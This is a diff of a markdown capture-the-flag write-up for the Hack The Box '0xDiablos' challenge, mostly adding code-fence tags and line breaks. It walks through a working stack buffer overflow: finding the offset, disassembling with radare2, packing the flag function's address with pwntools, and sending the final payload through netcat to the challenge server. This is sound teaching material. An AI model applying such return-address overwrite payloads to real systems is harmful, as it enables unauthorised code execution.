@@ -22,7 +22,7 @@ Tried to input long character strings we get a segmentation fault
 
 We use python to find how many characters break
 
-```
+```bash
 └──╼ $python -c 'print( "x" _ 183)' | ./vuln
 You know who are 0xDiablos:
 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
@@ -35,7 +35,7 @@ Erreur de segmentation
 
 we analyse the file
 
-```
+```bash
 file vuln
 vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=ab7f19bb67c16ae453d4959fba4e6841d930a6dd, for GNU/Linux 3.2.0, not stripped
 
@@ -127,7 +127,8 @@ Dump of assembler code for function main:
 End of assembler dump.
 ```
 
-Main function seems not to be vulnerable but calls vuln function...we disassemble vuln too and notice a gets() usage which can be vulnerable to BOF
+Main function seems not to be vulnerable but calls vuln function...
+we disassemble vuln too and notice a gets() usage which can be vulnerable to BOF
 
 There is a nice tool called `PEDA (gdb-peda)` that facilitate RE
 
@@ -135,7 +136,7 @@ Or use `Cutter` for code analysis alternatively to r2
 
 Now back to radare2
 
-```
+```bash
 r2 vuln
 
 aaaa //analyze
@@ -173,7 +174,7 @@ we see the script has 3 functions vuln, main and flag...main calls vuln which us
 
 we can overflow that function
 
-```
+```bash
 [0x080490d0]> pdf //show the funtions
 ;-- section..text:
 ;-- .text:
@@ -230,12 +231,12 @@ we can overflow that function
 │ 0x080492af c9 leave
 └ 0x080492b0 c3 ret
 
-//We are at address value from vuln that is 0x08049272
 ```
+We are at address value from vuln that is 0x08049272
 
 Now for flag function
 
-```
+```bash
 0x08049272]> s sym.flag
 [0x080491e2]> pdf
 ┌ 144: sym.flag (uint32_t arg_8h, uint32_t arg_ch);
@@ -299,7 +300,7 @@ Now for flag function
 
 Address for flag function is 0x080491e2...lets convert it to hex format with p32 from python `pwntools`
 
-```
+```python
 from pwn import \*
 p32(0x080491e2)
 b'\xe2\x91\x04\x08'
@@ -307,7 +308,7 @@ b'\xe2\x91\x04\x08'
 
 Payload is now `python2 -c "print('A'\*188 + '\xe2\x91\x04\x08')" | ./vuln`
 
-```
+```bash
 You know who are 0xDiablos:
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��
 Hurry up and try in on server side.
@@ -317,7 +318,7 @@ we print A 188 times instead of 184 because we need to override the return value
 
 It didnt work yet on server...there are 2 arguments in said function we need to match
 
-```
+```bash
 │ 0x08049246 817d08efbead. cmp dword [arg_8h], 0xdeadbeef
 │ ┌─< 0x0804924d 751a jne 0x8049269
 │ │ 0x0804924f 817d0c0dd0de. cmp dword [arg_ch], 0xc0ded00d
@@ -326,7 +327,7 @@ It didnt work yet on server...there are 2 arguments in said function we need to 
 
 we convert 0xdeadbeef and 0xc0ded00d to hex format and add them to payload + 4 bytes of characters
 
-Now the final paylaod is:
+Now the final payload is:
 
 `python2 -c "print('A'*188 + '\xe2\x91\x04\x08'+'A'*4+'\xef\xbe\xad\xde\r\xd0\xde\xc0')" | ./vuln`
 
@@ -334,11 +335,12 @@ used an [exploit.py](https://github.com/nair0lf32/CTF-Scripts/blob/master/Hackth
 
 You can also use netcat directly
 
-```
+```bash
 python2 -c "print('A'*188 + '\xe2\x91\x04\x08'+'A'*4+'\xef\xbe\xad\xde\r\xd0\xde\xc0')" | nc 138.68.131.63 31365
 You know who are 0xDiablos:
 ���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAAﾭ�
 HTB{Ìnsert_flag_here}
 ```
 
-How was that an easy challenge? Imagine the overall difficulty now...Go learn some assembly asap!!!
+How was that an easy challenge? Imagine the overall difficulty now...
+Go learn some assembly asap!!!
